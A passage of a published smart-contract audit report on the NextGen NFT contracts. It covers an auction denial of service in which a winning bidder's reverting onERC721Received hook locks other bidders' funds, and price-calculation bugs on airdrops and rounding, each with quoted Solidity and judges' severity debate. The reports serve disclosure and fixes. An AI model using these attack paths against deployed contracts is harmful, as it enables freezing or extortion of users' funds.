class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit funds not transferred</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><code>safeTransferFrom()</code> <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/ERC721.sol#L407\">calls back the receiver</a> if it is a contract.</p>\n<p>An adversary that won the auction can conditionally <code>revert</code> the execution of the transaction, upon the <code>onERC721Received()</code> callback.</p>\n<p>This will revert the whole transaction, making it impossible to transfer any funds.</p>\n<p>Bidders canâ€™t cancel their bids either via <code>cancelBid()</code> or <code>cancelAllBids()</code>, due to they only allow it to do so if the auction was not ended: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L125\">AuctionDemo.sol#L125</a></p>\n<p>The protocol, nor the previous token owner have a way to claim the earnings from the auction.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Move the logic to transfer the NFT to its own separated function.</p>\n<h3 id=\"assessed-type-8\" style=\"position:relative;\"><a href=\"#assessed-type-8\" aria-label=\"assessed type 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>DoS</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1839426119\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden specifies that the winning bidder may not implement a proper EIP-721 receive hook either deliberately or by accident.</p>\n<p>I consider this to be an exhibit validly categorized as a medium given that its impact is sabotage (i.e. loss-of-funds for other users) at the expense of a single high bid and it can also be used as extortion.</p>\n<p>This submission was selected as the best given that it cites the voidance of a main invariant of the protocol, articulates that the funds are irrecoverable, and mentions that it should be marked as a medium given that the attacker would also lose their bid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1848428010\">btk (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xsomeone, while #739 could be critical, the high cost makes it unlikely. To execute the attack, the malicious actor must win an auction, risking their funds to lock othersâ€™ funds, which is impractical in real-world scenarios. You can check <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1508\">#1508</a> where I discussed the issue without providing a PoC, as it is QA at max, here:</p>\n<blockquote>\n<p>Attackers can exploit this using <code>onERC721Received</code> too, but itâ€™s costlier since they need to be the highest bidder to claim the NFT.</p>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1848585215\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@btk, thanks for your contribution! I believe you are misjudging why this was selected as a medium-risk vulnerability while <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/734\">#734</a> is a high-risk vulnerability.</p>\n<p>Yes, the would-be attacker would need to be the winning bidder but they would acquire an NFT regardless that would offset the cost of the attack. Additionally, any bidder can simply â€œchooseâ€ to carry this attack or simply acquire the NFT. Specifying that the attack would be impractical is identical to saying users would not participate in auctions and win. </p>\n<p>The likelihood might be low, but the impact is high rendering this an aptly graded medium-risk vulnerability. #734 has a lower bar of entry and has been marked as high-risk as such. This was already elaborated <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1839426119\">in the relevant comment of this submission</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1876732920\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/739\">here</a>.</em></p>\n<hr>\n<h2 id=\"m-08-if-an-airdrop-happens-before-a-mint-the-price-could-skyrocket\" style=\"position:relative;\"><a href=\"#m-08-if-an-airdrop-happens-before-a-mint-the-price-could-skyrocket\" aria-label=\"m 08 if an airdrop happens before a mint the price could skyrocket permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381\">[M-08] If an airdrop happens before a mint the price could skyrocket</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381\">0x3b</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1937\">AvantGard</a> and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/246\">lanrebayode77</a></em></p>\n<p>As explained by the <a href=\"https://seize-io.gitbook.io/nextgen/nextgen-smart-contracts/features#minting-process\">docs</a>, several steps can occur during the minting process. However, an airdrop before <code>salesOption</code> 3 can lead to price inflation.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Under <code>salesOption</code> 3, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536\">getPrice</a> returns:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    + ((</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>This is the increased rate based on the NFTs <strong>already in circulation</strong>. If an airdrop occurs before a mint with <code>salesOption</code> 3, the price will be much higher than intended.</p>\n<p>Example:</p>\n<table>\n<thead>\n<tr>\n<th>Steps</th>\n<th>Option</th>\n<th>NFTs</th>\n<th>Price</th>\n<th>Rate</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1 OG users</td>\n<td>Airdropped</td>\n<td>20 NFTs</td>\n<td>free</td>\n<td>-</td>\n</tr>\n<tr>\n<td>2 Whitelisted</td>\n<td>Sales 3</td>\n<td>10 NFTs</td>\n<td>1 ETH</td>\n<td>10 (0.1 ETH increase)</td>\n</tr>\n<tr>\n<td>3 Public</td>\n<td>Sales 1</td>\n<td>70 NFTs</td>\n<td>2 ETH</td>\n<td>-</td>\n</tr>\n</tbody>\n</table>\n<p>With the current three steps, after the airdrop, <code>salesOption</code> 3 should start at 1 ETH and gradually increase to 2 ETH. Afterward, it should mint at a constant rate of 2 ETH.</p>\n<p>However, when sales option 3 starts, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536\">getPrice</a> will return 3 ETH instead of 1 ETH. This will cause the initial users to pay an inflated price, which was not intended by the owner and can harm their reputation. Itâ€™s also unfair to the users, as these so-called special (whitelisted) users will pay increased prices.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$$</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\\begin{align/ast}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\\text{collectionMintCost} + \\left(\\frac{\\text{collectionMintCost}}{\\text{rate}}\\right) \\times \\text{cirSupply}  \\\\</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">&amp;= 1 \\text{eth} + 0.1 \\text{eth} \\times 20 \\\\</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">&amp;= 1 \\text{eth} + 2 \\text{eth} \\\\</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">&amp;= 3 \\text{eth}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\\end{align/ast}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">$$</span></span></code></pre>\n<h3 id=\"poc-3\" style=\"position:relative;\"><a href=\"#poc-3\" aria-label=\"poc 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p>Gist <a href=\"https://gist.github.com/0x3b33/558b919a57101e7a0942e557a464078a\">here</a>. </p>\n<p>Add to remappings - <code>contracts/=smart-contracts/</code> and run it with <code>forge test --match-test test_airdrop --lib-paths ../smart-contracts</code>.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You can implement a mapping with the airdropped NFTs and deduct this value from <code>gencore.viewCirSupply(_collectionId)</code> to avoid disrupting the minting process.</p>\n<h3 id=\"assessed-type-9\" style=\"position:relative;\"><a href=\"#assessed-type-9\" aria-label=\"assessed type 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Error</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/246#issuecomment-1824028646\">a2rocket (NextGen) confirmed via duplicate issue #246</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1845253491\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After further consideration, I have decided to merge several periodic mint-related findings into two separate categories:</p>\n<ul>\n<li>Incorrect Price Calculations (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381\">#381</a>)</li>\n<li>Incorrect Enforcement of Periodic Mint Limitations (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/380\">#380</a>) </li>\n</ul>\n<p>The reasoning behind this change is that both rely on different aspects of the code and have different root causes. The former highlights a flaw in the <code>getPrice</code> function and how it calculates prices, whilst the latter highlights a flaw in the <code>mint</code> function and how it calculates the <code>lastMintDate</code>. Fixing one does not infer that the other is fixed, reinforcing the idea that they are separate vulnerabilities.</p>\n<p>I consider this submission to be of a lower severity than #380, correctly given that it can be rectified. Specifically, a <code>lastMintDate</code> update in the future per <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012\">#2012</a> <strong>cannot be reversed</strong>, while an incorrect price as indicated in this and relevant submissions can be reversed by reconfiguring the collection and can be controlled by the user simply not willing to pay the inflated price until the price is corrected.</p>\n<p>A problem when selecting the best report in this submission is that all Warden submissions make mention of â€œairdroppedâ€ tokens and fail to identify <strong>that the general circulating supply affects the price in their proposed remediation</strong>, such as #380. I have thus chosen this report as the best given that it cites the relevant documentation, contains a privately accessible valid PoC, and provides a basic representation of the pricing formula using mathematical notation to illustrate the problem.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1848456338\">MrPotatoMagic (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xsomeone, here is why I believe this issue (and its duplicates) should be marked as a duplicate of #380 but with a partial grading.</p>\n<ol>\n<li>The root cause is the same, i.e. existing circulating supply causes sale model 3 to work incorrectly.</li>\n<li>The impact mentioned here and that in #380 are two sides of the same coin.</li>\n<li>The issue mentions that prices will skyrocket (which is true) but the issue also mentions that <code>initial users to pay an inflated price</code>, which is incorrect since the user cannot mint (pay) in the first place due to the <code>lastMintDate</code> being set to a date far ahead in the future.</li>\n<li>I mention partial grading because although the root cause is correct, the impact demonstrated is invalid. Thus, according to the <a href=\"https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-penalty-award-standardization-duplicate-report-poc-thoroughness\">C4 final SC verdict in the docs</a>, the issue should deserve a partial-grading, while being marked as a dup of #380 due to the root cause being the same.</li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1848638016\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@MrPotatoMagic, thanks for contributing! The root cause is not the presence of the circulating supply, it is the incorrect price calculation of a sale model 3. <strong>While it may make sense to carry over sale model 3 sales across different periods, it does not make sense to carry over mint restrictions</strong>. For example:</p>\n<ul>\n<li>Collection A runs a periodic sale, amassing 10 NFTs sold, and reaching a price of 10 ETH per NFT.</li>\n<li>Collection A performs an airdrop as part of an incentive program.</li>\n<li>Collection A opens up the periodic sale for a public run, wanting to maintain the 10 ETH per NFT price.</li>\n</ul>\n<p>To fix this:</p>\n<ul>\n<li>\n<h1 id=\"381-would-need-to-update-its-price-calculation-to-use-solely-the-circulating-supply-minted-via-the-periodic-sale\" style=\"position:relative;\"><a href=\"#381-would-need-to-update-its-price-calculation-to-use-solely-the-circulating-supply-minted-via-the-periodic-sale\" aria-label=\"381 would need to update its price calculation to use solely the circulating supply minted via the periodic sale permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>381 would need to update its price calculation to use solely the circulating supply minted via the periodic sale.</h1>\n</li>\n<li>\n<h1 id=\"380-would-need-to-reset-its-lastmintdate-entirely\" style=\"position:relative;\"><a href=\"#380-would-need-to-reset-its-lastmintdate-entirely\" aria-label=\"380 would need to reset its lastmintdate entirely permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>380 would need to <strong>reset its <code>lastMintDate</code> entirely</strong>.</h1>\n</li>\n</ul>\n<p>A fix for #380 does not fix #381 and vice versa. Both concern different parts of the code and require different alleviations.</p>\n<p>Based on the above, I will maintain these submissions as separate. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-getprice-salesoption-2-can-round-down-to-the-lower-barrier-skipping-the-last-time-period\" style=\"position:relative;\"><a href=\"#m-09-getprice-salesoption-2-can-round-down-to-the-lower-barrier-skipping-the-last-time-period\" aria-label=\"m 09 getprice salesoption 2 can round down to the lower barrier skipping the last time period permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/271\">[M-09] <code>getPrice</code> <code>salesOption</code> 2 can round down to the lower barrier, skipping the last time period</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/271\">0x3b</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1528\">dimulski</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/904\">KupiaSec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/845\">t0x1c</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/360\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/273\">degensec</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/393\">REKCAH</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L530\">getPrice</a> in <code>salesOption</code> 2 can round down to the lower barrier, effectively skipping the last time period. In simpler terms, if the price is scheduled to decrease over 4 hours, it will decrease for 2.999â€¦ hours and then jump to the price at the end of the 4th hour.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L530\">getPrice</a> uses <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553\">this else-if calculation</a> to determine whether it should return the price as an equation or just the final price.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (((</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The <code>if</code> statementâ€™s method of division by <code>rate</code> is incorrect, as it results in rounding down and incorrect price movements. This can cause the price to jump over the last time period, effectively decreasing faster than intended.</p>\n<p>Example:</p>\n<table>\n<thead>\n<tr>\n<th>Values</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>collectionMintCost</code></td>\n<td>0.49 ETH</td>\n</tr>\n<tr>\n<td><code>collectionEndMintCost</code></td>\n<td>0.1 ETH</td>\n</tr>\n<tr>\n<td><code>rate</code></td>\n<td>0.1 ETH (per hour)</td>\n</tr>\n<tr>\n<td><code>timePeriod</code></td>\n<td>1 hour - 3600 sec</td>\n</tr>\n</tbody>\n</table>\n<p>Hour 0 to 1 - 0.49 ETH.<br>\nHour 1 to 2 - 0.39 ETH - as it crosses the 1st hour, the price becomes 0.39 ETH.<br>\nHour 2 to 3 - 0.29 ETH - same here.<br>\nIt should go from 3 to 4 to 0.19 ETH, but that step is missed, and it goes directly to 0.1 ETH - the final price.<br>\nHour 3 to 4 - 0.10 ETH - the final price.</p>\n<h3 id=\"math\" style=\"position:relative;\"><a href=\"#math\" aria-label=\"math permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Math</h3>\n<p>The equation for calculating <code>tDiff</code> using the provided variables is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$$</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">tDiff = \\frac{{\\text{block.timestamp} - \\text{collectionPhases}\\[\\text{collectionId}].\\text{allowlistStartTime}}}{{\\text{collectionPhases}\\[\\text{collectionId}].\\text{timePeriod}}}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">$$</span></span></code></pre>\n<p>We want the crossover when hour 2 switches to 3, which is when <code>(block.timestamp - collectionPhases[_collectionId].allowlistStartTime)</code> = 3 h or 10800 